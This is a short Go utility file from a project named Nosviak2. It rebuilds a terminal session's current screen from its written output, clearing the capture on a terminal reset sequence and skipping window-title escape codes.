package util

import (
	"Nosviak2/core/clients/sessions"
	"strings"
)

//grabs the clients screen properly
//this will ensure its done without issues
func Screen(s *sessions.Session) ([]string, error) {

	var currentCapture []string = make([]string, 0)


	for item := range s.Written {

		//current capture system here properly
		if strings.Contains(s.Written[item], "\033c") {
			currentCapture = make([]string, 0); continue
		}

		//ignores title segmants properly
		if strings.Contains(s.Written[item], "\033]0;") || strings.Contains(s.Written[item], "\033]0;") {
			continue
		}

		currentCapture = append(currentCapture, s.Written[item])
	}

	return currentCapture, nil
}